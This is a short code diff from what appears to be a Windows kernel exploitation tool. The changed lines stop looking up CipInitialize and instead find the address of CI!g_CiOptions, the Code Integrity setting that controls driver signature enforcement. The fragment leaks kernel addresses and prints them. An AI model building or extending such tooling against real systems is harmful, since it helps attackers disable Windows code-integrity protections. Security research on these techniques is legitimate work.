@@ -14,16 +14,17 @@ int main(int argc, char **argv)
 {
   LPVOID CiImagepMem   = 0;
   LPVOID CiImageBase   = 0;
-  LPVOID CipInitBase   = 0;
+  LPVOID CigOptsBase   = 0;
   DWORD  CiImageLen    = 0;
 
   CiImageBase = KeGetBase("CI.dll", &CiImageLen);
   if ( (CiImageBase != NULL) )
   {
     printf("[+] Leaked CI @ %p\n", CiImageBase);
-    if ( (CipInitBase = GetCipInit(CiImageBase)) != NULL )
+    if ( (CigOptsBase = GetCiOptions1(CiImageBase)) != NULL )
     {
-	    printf("[+] CipInitialize @ %p\n", CipInitBase);
+	    printf("[+] Leaked CI!g_CiOptions @ %p\n", 
+			    CigOptsBase);
     };
   };
 };
